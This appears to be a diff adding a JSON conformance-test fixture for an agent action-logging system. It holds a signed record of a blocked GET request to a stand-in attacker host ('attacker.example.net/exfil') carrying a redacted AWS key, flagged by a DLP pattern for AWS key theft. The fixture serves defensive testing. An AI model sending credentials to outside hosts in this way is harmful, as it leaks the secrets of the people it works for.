@@ -1,0 +1,29 @@
+{
+  "version": 1,
+  "action_record": {
+    "version": 1,
+    "action_id": "conformance-00000",
+    "action_type": "read",
+    "timestamp": "2026-04-15T12:00:00Z",
+    "principal": "org:conformance-test",
+    "actor": "agent:conformance-runner",
+    "delegation_chain": [
+      "test-policy-v1",
+      "test-grant"
+    ],
+    "target": "https://attacker.example.net/exfil?key=AKIA...REDACTED",
+    "side_effect_class": "external_read",
+    "reversibility": "full",
+    "policy_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "verdict": "block",
+    "transport": "https",
+    "method": "GET",
+    "layer": "dlp",
+    "pattern": "api_key_aws",
+    "severity": "critical",
+    "chain_prev_hash": "genesis",
+    "chain_seq": 0
+  },
+  "signature": "ed25519:aa0d02932f9566de8eecc2a4de119e96cdb7743c7f50f54f52578dccd2ecc805f26b9602747275e657078af07e0fde4bcb61251906655d580e34d777f7408a04",
+  "signer_key": "890726e93f89e773fb3b4298271245a69c1884fd1003846c3358b8b65a2288fa"
+}
